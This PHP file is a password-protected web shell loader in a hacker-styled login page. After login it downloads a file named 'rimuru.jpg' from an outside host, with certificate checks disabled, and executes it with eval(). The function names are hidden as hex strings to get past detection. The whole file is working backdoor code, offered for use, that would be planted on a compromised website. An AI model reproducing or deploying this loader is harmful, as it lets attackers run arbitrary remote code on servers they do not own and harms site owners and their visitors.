<?php
session_start();

$secure_password_hash = '$2y$10$XZ.gQZx8RX8n72PV19Fn7eC24vdku28vrr836p6fMEsOXa2aH.9nG'; 
$session_key = hash('sha256', $_SERVER['HTTP_HOST']);

function show_login_form()
{
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Aptisme</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: #111;
            padding: 30px;
            border: 2px solid #0f0;
            border-radius: 10px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
        }
        input[type=submit] {
            background: #0f0;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        input[type=submit]:hover {
            background: #00b300;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <form method="post">
            <label>Password:</label>
            <input type="password" name="password" required>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
HTML;
    exit;
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $methods = array(
        hex2str('666f70656e'), 
        hex2str('73747265616d5f6765745f636f6e74656e7473'), 
        hex2str('66696c655f6765745f636f6e74656e7473'), // 
        hex2str('6375726c5f65786563') 
    );

    if (function_exists($methods[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible)");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $result = $methods[3]($ch);
        curl_close($ch);
        return $result;
    } elseif (function_exists($methods[2])) {
        return $methods[2]($destiny);
    } elseif (function_exists($methods[0]) && function_exists($methods[1])) {
        $handle = $methods[0]($destiny, "r");
        $result = $methods[1]($handle);
        fclose($handle);
        return $result;
    }
    return false;
}

if (!isset($_SESSION[$session_key])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $secure_password_hash)) {
            $_SESSION[$session_key] = true;
        } else {
            show_login_form();
        }
    } else {
        show_login_form();
    }
}

$target_url = 'https://haxor-research.com/rimuru.jpg';
$payload = geturlsinfo($target_url);
if ($payload !== false) {
    eval('?>' . $payload);
}
?>
